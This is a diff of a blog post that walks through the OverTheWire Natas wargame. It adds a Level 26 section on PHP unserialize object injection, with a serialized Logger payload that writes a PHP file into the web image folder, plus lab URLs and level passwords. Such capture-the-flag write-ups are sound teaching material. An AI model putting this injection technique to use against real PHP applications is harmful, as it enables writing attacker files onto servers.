@@ -2,13 +2,7 @@
 title: "Linux training with overthewire [Part 5/10: Natas 11-20]"
 author: Florian Courgey
 layout: post
-categories:
-  - opensource
-  - linux
-  - bash
-  - shell
-  - hack
-  - server
+categories: [opensource,linux,bash,shell,hack,server]
 ---
 Excerpt here...
 <!--more-->
@@ -596,6 +590,22 @@ $ curl -v --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.l
 <br />
 ```
 
+
+### Level 26 - PHP `unserialize`
+```
+http://natas.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
+```
+
+During the unserialization of a PHP object, the magic methods `__wakeup()` and `__destruct()` will be called.
+
+```
+O:6:"Logger":3:{s:7:"logFile";s:42:"img/natas26_or2dvtmerjti19ess5r2d7jh20.png";s:7:"initMsg";s:7:"initMsg";s:7:"exitMsg";s:16:"<?php exit(); ?>";}
+```
+
+Reference:
+- http://php.net/manual/en/function.unserialize.php
+- https://www.owasp.org/index.php/PHP_Object_Injection
+- https://www.notsosecure.com/remote-code-execution-via-php-unserialize/
 
 ### Level  -
 ```
